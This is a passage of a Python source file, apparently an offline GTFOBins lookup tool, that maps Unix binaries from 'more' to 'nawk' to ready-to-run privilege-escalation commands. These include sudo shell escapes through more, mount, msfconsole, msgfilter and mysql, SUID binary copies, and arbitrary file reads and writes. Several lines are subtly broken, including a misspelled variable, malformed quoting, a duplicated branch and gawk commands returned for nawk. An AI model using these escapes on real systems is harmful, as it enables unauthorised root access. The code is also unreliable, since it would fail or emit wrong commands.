            bins.append(r"sudo install -m =xs $(which more) .\n./more file_to_read")
        elif gtfo_options == "sudo":
            bins.append(r"TERM= sudo more /etc/profile\n!/bin/sh")

    elif gtfo_command == "mosquitto":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmosquitto -c ""$LFILE""")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which mosquitto) .\nLFILE=file_to_read\n./mosquitto -c ""$LFILE""")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo mosquitto -c ""$LFILE""")
        elif gtfo_options == "shell":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "mount":
        if gtfo_options == "sudo":
            bins.append(r"sudo mount -o bind /bin/sh /bin/mount\nsudo mount")
        elif gtfo_options == "shell":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "file-read":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "msfconsole":
        if gtfo_options == "shell":
            bins.append(r"sudo msfconsole\nmsf6 > irb\n>> system(""/bin/sh"")")
        elif gtfo_options == "sudo":
            bins.append(r"sudo msfconsole\nmsf6 > irb\n>> system(""/bin/sh"")")
        elif gtfo_options == "file-read":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")

    elif gtfo_command == "msgattrib":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmsgattrib -P $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which msgattrib) .\nLFILE=file_to_read\n./msgattrib -P $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nmsgattrib -P $LFILE")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "shell":
            bins.append("N/A")

    elif gtfo_command == "msgcat":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmsgcat -P $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"sudo LFILE=file_to_read\nmsgcat -P $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which msgcat) .\nLFILE=file_to_read\n./msgcat -P $LFILE")
        elif gtfo_options == "shell":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "msgconv":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmsgconv -P $LFILE")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which msgconv) .\nLFILE=file_to_read\n./msgconv -P $LFILE")
        elif gtfo_options == "sudo":
            bins.append(r"LFILE=file_to_read\nsudo msgconv -P $LFILE")
        elif gtfo_options == "shell":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "msgfilter":
        if gtfo_options == "shell":
            bins.append("echo x | msgfilter -P /bin/sh -c "'/bin/sh 0<&2 1>&2; kill $PPID'"")
        elif gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmsgfilter -P -i ""LFILE"" /bin/cat")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which msgfilter) .\necho x | ./msgfilter -P /bin/sh -p -c "'/bin/sh -p 0<&2 1>&2; kill $PPID'"")
        elif gtfo_options == "sudo":
            bins.append("echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "msgmerge":
        if gtfo_options == "file-read":
            bins.append(r"LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null")
        elif gtfo_options == "suid":
            bins.append(r"sudo install -m =xs $(which msgmerge) .\nLFILE=file_to_read\n./msgmerge -P $LFILE /dev/null")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "shell":
            bins.append("N/A")
   
    elif gtfo_command == "msguniq":
        if gtfo_options == "file-read":
            bins.append("msguniq -P /path/to/input-file")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "shell":
            bins.append("N/A")
    
    elif gtfo_command == "mtr":
        if gtfo_options == "file-read":
            bins.append("mtr --raw -F /path/to/input-file")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "shell":
            bins.append("N/A")

    elif gtfo_command == "multitime":
        if gtfo_options == "shell":
            bins.append("multitime /bin/sh")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "file-read":
            bins.append("N/A")

    elif gtfo_command == "mutt":
        if gtfo_options == "file-read":
            bins.append("mutt -F /path/to/input-file")
        elif gtfo_options == "shell":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        
    elif gtfo_command == "mv":
        if gtfo_options == "file-write":
            bins.append("echo DATA >/path/to/temp-file\nmv /path/to/temp-file /path/to/output-file")
        elif gtfo_options == "file-read":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("mv /path/to/input-file /path/to/output-file")
        elif gtfo_options == "suid":
            bins.append("mv /path/to/input-file /path/to/output-file")
        elif gtfo_options == "shell":
            bins.append("N/A")

    elif gtfo_command == "mypy":
        if gtfo_options == "file-write":
            bins.append("mypy /path/to/input-file --junit-xml /path/to/output-file")
        elif gtfo_optons == "file-read":
            bins.append("mypy /path/to/input-file")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "shell":
            bins.append("N/A")

    elif gtfo_command == "mysql":
        if gtfo_options == "shell":
            bins.append("mysql -e '\! /bin/sh'")
        elif gtfo_options == "file-write":
            bins.append("mysql --default-auth ../../../../../path/to/lib")
        elif gtfo_options == "file-read":
            bins.append("N/A")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")

    elif gtfo_command == "nasm":
        if gtfo_options == "file-read":
            bins.append("nasm -@ /path/to/input-file")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")
        elif gtfo_options == "file-write":
            bins.append("N/A")

    elif gtfo_command == "nawk":
        if gtfo_options == "shell":
            bins.append("gawk '"'BEGIN {system("/bin/sh")}'"'")
        elif gtfo_options == "file-write":
            bins.append("gawk '"'BEGIN { print "DATA" > "/path/to/output-file" }'"'")
        elif gtfo_options == "file-read":
            bins.append("gawk '//' /path/to/input-file")
        elif gtfo_options == "sudo":
            bins.append("N/A")
        elif gtfo_options == "suid":
            bins.append("N/A")

#If there are any other misconfigurations run the other option
    elif gtfo_command == "other":
        if gtfo_options == "shell": #This will print out hints for more GTFO bins!
            bins.append("Please refer to the GTFO bins website for more!")
        elif gtfo_options == "git": #This will give a git clone command to run when more bins are needed but available
            bins.append("If git is install please run \ngit clone https://github.com/GTFOBins/GTFOBins.github.io.git\nThen cd into the directory and then into the folder marked _gtfobins")
            
    return bins

def main():
    print("*If a GTFO bin is not found please type 'other' then 'git'*")
    start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n\nofg> ").strip().lower()

    ALLOWED = {
        "zip", "7zip", "base64", "bash", "awk", "base32", "busybox", "cat",
        "neofetch", "cp", "curl", "chmod", "dosbox", "dmesg", "gcc", "vim",
        "vi", "nano", "zsh", "dd", "aa-exec", "ab", "agetty", "alpine",
        "ansible-playbook", "ansible-test", "aoss", "apache2ctl", "apt-get",
        "ar", "apt", "aria2c", "arj", "arp", "as", "ascii-xfr", "ascii85",
        "ash", "aspell", "at", "atobm", "aws", "base58", "basenc", "basez",
        "batcat", "bc", "bconsole", "bpftrace", "bridge", "bundle", "bundler",
        "busctl", "byebug", "bzip2", "c89", "c99", "cabal", "cancel", "capsh",
        "cdist", "certbot", "check_by_ssh", "check_cups", "check_log",
        "check_memory", "check_raid", "check_ssl_cert", "check_statusfile",
        "choom", "chown", "chroot", "clamscan", "cmp", "cobc", "column",
        "comm", "composer", "cowsay", "cowthink", "cpan", "cpio", "cpulimit",
        "crash", "crontab", "csh", "csvtool", "cupsfilter", "cut", "dash",
        "date", "dc", "debugfs", "dialog", "diff", "dig", "distcc",
        "dmidecode", "dmsetup", "dnf", "docker", "dos2unix", "dotnet", "dpkg",
        "dstat", "dvips", "eb", "ed", "efax", "emacs", "elvish", "enscript",
        "env", "eqn", "espeak", "ex", "exiftool", "expand", "expect", "facter",
        "file", "find", "finger", "fish", "flock", "fmt", "fold", "fping",
        "ftp", "gawk", "gcloud", "gcore", "gdb", "gem", "genie", "genisoimage",
        "ghc", "ghci", "gimp", "ginsh", "git", "grc", "grep", "gtester", "gzip",
        "hd", "head", "hexdump", "highlight", "hping3", "iconv", "iftop",
        "install", "ionice", "ip", "irb", "ispell", "jjs", "joe", "join",
        "jounralctl", "jq", "jrunscript", "jtag", "julia", "knife", "ksh",
        "ksshell", "ksu", "kubectl", "latex", "latexmk", "less", "ld.so",
        "ldconfig", "lftp", "links", "ln", "loginctl", "logsave", "look",
        "ltrace", "lp", "lua", "lualatex", "luatex", "lwp-download", "lwp-request",
        "mail", "make", "man", "mawk", "minicom", "more", "mosquitto", "mount",
        "msfconsole", "msgattrib", "msgcat", "msgconv", "msgfilter", "msgmerge",
        "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk", "other",
    }

    if start in ALLOWED:
        gtfo_options = input("Choose following options: shell, file-read, file-write, sudo, suid\n\nofg> ").strip().lower()

        VALID_OPTIONS = {"shell", "file-read", "file-write", "sudo", "suid", "git"}

        if gtfo_options in VALID_OPTIONS:
            bins = gtfo_bins(start, gtfo_options)
            print("\nSuggested GTFO Bins:\n")
            for entry in bins:
                print(entry)
        else:
            print("\nInvalid option for the chosen tool.\n")
            return 1
    else:
        print("\nTool not found. Please enter a valid tool name (e.g., 'zip', '7zip', 'base64' or 'other').\n")
        return 1

if __name__ == "__main__":
    main()

